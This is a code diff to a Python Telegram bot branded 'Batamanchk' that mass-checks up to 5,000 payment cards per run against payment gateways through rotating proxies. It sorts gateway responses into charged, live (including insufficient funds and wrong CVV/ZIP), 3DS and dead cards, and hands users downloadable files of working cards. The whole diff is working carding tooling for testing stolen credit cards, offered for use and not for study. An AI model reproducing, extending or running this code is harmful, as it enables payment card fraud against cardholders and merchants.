@@ -12,6 +12,12 @@ from config import (
 )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BOT IDENTITY — Batamanchk
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+BOT_NAME    = "Batamanchk"
+BOT_CHANNEL = "https://t.me/Batcardchk"
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONFIGURATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 MAX_CARDS       = 5000          # ← increased from 500
@@ -141,6 +147,16 @@ class ProxyRotator:
         return proxy
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# RESPONSE CLASSIFICATION
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Synced from msh.py + uploaded source:
+#   CHARGED  — ORDER_PAID / CHARGED / CAPTURED / status=true + "approved"
+#   3DS      — 3DS_REQUIRED / 3D_SECURE / "3d secure"
+#   APPROVED — INSUFFICIENT_FUNDS / INCORRECT_CVV/CVC/ZIP → live card
+#   DEAD     — hard declines
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # MASS CHECK CORE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def check_single_card(session, gate_key, api_url, site, card, proxy, semaphore):
@@ -172,13 +188,28 @@ async def check_single_card(session, gate_key, api_url, site, card, proxy, semap
             ).strip()
             status     = str(data.get("Status") or data.get("status") or "false").lower()
             resp_lower = response_text.lower()
+            resp_upper = response_text.upper()
 
-            if status == "true" or "approved" in resp_lower:
-                card_status = "approved"
-            elif "3ds" in resp_lower or "3d secure" in resp_lower:
+            # ── Classification — synced from uploaded source + msh.py ──
+            if (status == "true"
+                    or "approved" in resp_lower
+                    or "ORDER_PAID" in resp_upper
+                    or "CHARGED" in resp_upper
+                    or "captured" in resp_lower):
+                # Distinguish real charge from "approved" live
+                if ("ORDER_PAID" in resp_upper or "CHARGED" in resp_upper
+                        or "captured" in resp_lower):
+                    card_status = "charged"
+                else:
+                    card_status = "approved"
+            elif ("3ds" in resp_lower or "3d secure" in resp_lower
+                    or "3DS_REQUIRED" in resp_upper or "3D_SECURE" in resp_upper):
                 card_status = "3ds"
-            elif "charged" in resp_lower or "captured" in resp_lower:
-                card_status = "charged"
+            elif ("INSUFFICIENT_FUNDS" in resp_upper
+                    or "INCORRECT_CVV" in resp_upper
+                    or "INCORRECT_CVC" in resp_upper
+                    or "INCORRECT_ZIP" in resp_upper):
+                card_status = "approved"
             else:
                 card_status = "dead"
 
@@ -191,10 +222,62 @@ async def check_single_card(session, gate_key, api_url, site, card, proxy, semap
         except Exception as e:
             return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false", "card_status": "dead"}
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# PROGRESS MESSAGE BUILDER — Premium Sticker UI
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _user_display(user) -> str:
+    """Return HTML display for user (name/username)."""
+    if user is None:
+        return "User"
+    name = user.first_name or "User"
+    if user.username:
+        return f'<a href="https://t.me/{user.username}">{name}</a>'
+    return f'<a href="tg://user?id={user.id}">{name}</a>'
+
+def _build_progress_msg(
+    gate_name: str, done: int, total: int,
+    charged: int, live: int, dead: int, errors: int,
+    elapsed: float, user=None
+) -> str:
+    """
+    Premium sticker progress format:
+    🛒 Gate ➳ {gate_name}
+    🔄 Progress ➳ N/Total
+    Charged ➳ N 💎
+    Live ➳ N ✅
+    Dead ➳ N ❌
+    Errors ➳ N ⚠️
+    Time ➳ Xs
+    👤 ➳ Tom ⭐
+    ⚡ ➳ Batamanchk ⭐
+    """
+    minutes  = int(elapsed // 60)
+    seconds  = int(elapsed % 60)
+    time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+    user_html = _user_display(user)
+    dev_link  = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
+
+    return (
+        f"<b>🛒 Gate ➳ {gate_name}</b>\n"
+        f"<b>🔄 Progress ➳ {done}/{total}</b>\n"
+        f"<b>Charged ➳ {charged} 💎</b>\n"
+        f"<b>Live ➳ {live} ✅</b>\n"
+        f"<b>Dead ➳ {dead} ❌</b>\n"
+        f"<b>Errors ➳ {errors} ⚠️</b>\n"
+        f"<b>Time ➳ {time_str}</b>\n"
+        f"<b>👤 ➳ {user_html} ⭐</b>\n"
+        f"<b>⚡ ➳ {dev_link} ⭐</b>"
+    )
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# MASS CHECK RUNNER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_key: str):
     cfg       = GATE_CONFIG[gate_key]
     gate_name = cfg["name"]
-    user_id   = update.effective_user.id
+    user      = update.effective_user
+    user_id   = user.id
 
     # ── Maintenance check ──
     if context.bot_data.get("maintenance") and user_id != OWNER_ID:
@@ -267,15 +350,9 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
     rotator         = ProxyRotator(dynamic_proxies)
     sites_to_use    = dynamic_sites if dynamic_sites else [site]
 
+    # ── Starting message — premium UI ──
     msg = await update.message.reply_text(
-        f"[₪] <b>Gᴀᴛᴇ</b> ➺ {gate_name}\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"      [◈] <b>Sᴛᴀᴛᴜs</b> ➺ Sᴛᴀʀᴛɪɴɢ...\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"📊 <b>Cᴀʀᴅꜱ</b> ➺ {len(cards):,}\n"
-        f"🌐 <b>Sɪᴛᴇs</b> ➺ {len(sites_to_use)}\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...",
+        _build_progress_msg(gate_name, 0, len(cards), 0, 0, 0, 0, 0.0, user),
         parse_mode="HTML"
     )
 
@@ -295,10 +372,15 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
             for i, card in enumerate(cards)
         ]
 
-        # ── Progress updates every 200 cards for large runs ──
-        UPDATE_EVERY = 200
-        parsed       = []
-        done         = 0
+        # ── Progress updates every 10 cards — premium UI ──
+        UPDATE_EVERY   = 10
+        parsed         = []
+        done           = 0
+        charged_count  = 0
+        live_count     = 0
+        dead_count     = 0
+        error_count    = 0
+
         for coro in asyncio.as_completed(tasks):
             result = await coro
             if isinstance(result, Exception):
@@ -306,30 +388,45 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
                           "status": "false", "card_status": "dead"}
             parsed.append(result)
             done += 1
+
+            # ── Count into the right bucket ──
+            if result.get("error"):
+                error_count += 1
+            else:
+                cs = result.get("card_status", "dead")
+                if cs == "charged":
+                    charged_count += 1
+                elif cs in ("approved", "3ds"):
+                    live_count += 1
+                else:
+                    dead_count += 1
+
             if done % UPDATE_EVERY == 0:
-                live_so_far = sum(1 for r in parsed if r.get("card_status") == "approved")
+                elapsed = time.time() - start_time
                 try:
                     await msg.edit_text(
-                        f"[₪] <b>Gᴀᴛᴇ</b> ➺ {gate_name}\n"
-                        f"━━━━━━━━━━━━━━\n"
-                        f"      [◈] <b>Sᴛᴀᴛᴜs</b> ➺ Rᴜɴɴɪɴɢ...\n"
-                        f"━━━━━━━━━━━━━━\n"
-                        f"📊 <b>Pʀᴏɢʀᴇss</b> ➺ {done:,}/{len(cards):,}\n"
-                        f"✅ <b>Lɪᴠᴇ</b>     ➺ {live_so_far}\n"
-                        f"⏱ <b>Tɪᴍᴇ</b>    ➺ {time.time() - start_time:.0f}s\n"
-                        f"━━━━━━━━━━━━━━\n"
-                        f"⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...",
+                        _build_progress_msg(
+                            gate_name, done, len(cards),
+                            charged_count, live_count, dead_count, error_count,
+                            elapsed, user
+                        ),
                         parse_mode="HTML"
                     )
                 except Exception:
                     pass
 
+    # ── Final tally ──
     approved_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "approved"]
     charged_list  = [r for r in parsed if not r.get("error") and r.get("card_status") == "charged"]
     threeds_list  = [r for r in parsed if not r.get("error") and r.get("card_status") == "3ds"]
     dead_list     = [r for r in parsed if not r.get("error") and r.get("card_status") == "dead"]
     error_list    = [r for r in parsed if r.get("error")]
     elapsed       = time.time() - start_time
+
+    total_live    = len(approved_list) + len(threeds_list)
+    total_charged = len(charged_list)
+    total_dead    = len(dead_list)
+    total_errors  = len(error_list)
 
     context.bot_data[f"mass_results_{user_id}_{gate_key}"] = {
         "parsed": parsed, "approved": approved_list, "charged": charged_list,
@@ -338,31 +435,25 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
     }
     context.bot_data[f"last_mass_{user_id}"] = f"mass_results_{user_id}_{gate_key}"
 
-    summary = (
-        f"[₪] <b>Gᴀᴛᴇ</b> ➺ {gate_name}\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"      [◈] <b>Sᴛᴀᴛᴜs</b> ➺ Fɪɴɪsʜᴇᴅ ✅\n"
-        f"      [𖣸] <b>Cʜᴇᴄᴋᴇᴅ</b> ➺ {len(parsed):,}/{len(cards):,}\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"♘ <b>Aᴘᴘʀᴏᴠᴇᴅ</b> ➺ {len(approved_list)} ✅\n"
-        f"♞ <b>Cʜᴀʀɢᴇᴅ</b>  ➺ {len(charged_list)} 💎\n"
-        f"🔐 <b>3Ds</b>      ➺ {len(threeds_list)}\n"
-        f"❌ <b>Dᴇᴀᴅ</b>     ➺ {len(dead_list)}\n"
-        f"⚠️ <b>Eʀʀᴏʀs</b>  ➺ {len(error_list)}\n"
-        f"⏱ <b>Tɪᴍᴇ</b>    ➺ {elapsed:.0f}s\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"📢 @Batcardchk"
+    # ── Final message — same premium UI, fully filled ──
+    await msg.edit_text(
+        _build_progress_msg(
+            gate_name, len(parsed), len(parsed),
+            total_charged, total_live, total_dead, total_errors,
+            elapsed, user
+        ),
+        parse_mode="HTML",
+        reply_markup=_create_result_buttons()
     )
-    await msg.edit_text(summary, parse_mode="HTML", reply_markup=_create_result_buttons())
 
 def _create_result_buttons() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [
-            InlineKeyboardButton("✅ LIVE",   callback_data="result_live"),
-            InlineKeyboardButton("🔐 3DS",    callback_data="result_3ds"),
+            InlineKeyboardButton("💎 CHARGED", callback_data="result_charge"),
+            InlineKeyboardButton("✅ LIVE",    callback_data="result_live"),
         ],
         [
-            InlineKeyboardButton("💎 CHARGE", callback_data="result_charge"),
+            InlineKeyboardButton("🔐 3DS",    callback_data="result_3ds"),
             InlineKeyboardButton("📦 ALL",    callback_data="result_all"),
         ],
     ])
@@ -405,7 +496,7 @@ async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
             lines.append(f"Card: {card}\nStatus: {status}\nResponse: {resp}\n{'-'*30}")
         file_content = "\n".join(lines)
         caption      = f"📦 All Results ({len(parsed):,} total) — @Batcardchk"
-        file_name    = f"ALL_{user_id}.txt"
+        file_name    = f"BATAMANCHK_ALL_{user_id}.txt"
         bio          = BytesIO(file_content.encode("utf-8"))
         bio.name     = file_name
         await context.bot.send_document(
@@ -417,15 +508,15 @@ async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
     if action == "result_live":
         cards_out = results.get("approved", [])
         caption   = f"✅ LIVE Cards ({len(cards_out):,} found) — @Batcardchk"
-        file_name = f"LIVE_{user_id}.txt"
+        file_name = f"BATAMANCHK_LIVE_{user_id}.txt"
     elif action == "result_3ds":
         cards_out = results.get("threeds", [])
         caption   = f"🔐 3DS Cards ({len(cards_out):,} found) — @Batcardchk"
-        file_name = f"3DS_{user_id}.txt"
+        file_name = f"BATAMANCHK_3DS_{user_id}.txt"
     elif action == "result_charge":
         cards_out = results.get("charged", [])
         caption   = f"💎 Charged Cards ({len(cards_out):,} found) — @Batcardchk"
-        file_name = f"CHARGED_{user_id}.txt"
+        file_name = f"BATAMANCHK_CHARGED_{user_id}.txt"
     else:
         return
 
@@ -433,9 +524,11 @@ async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
         await query.answer("No cards in this category.", show_alert=True)
         return
 
-    file_content = "\n".join(r["card"] for r in cards_out)
-    bio          = BytesIO(file_content.encode("utf-8"))
-    bio.name     = file_name
+    file_content = "\n".join(
+        f"{r['card']} | {r.get('response', 'N/A')}" for r in cards_out
+    )
+    bio      = BytesIO(file_content.encode("utf-8"))
+    bio.name = file_name
     await context.bot.send_document(
         chat_id=query.message.chat_id, document=bio,
         filename=file_name, caption=caption
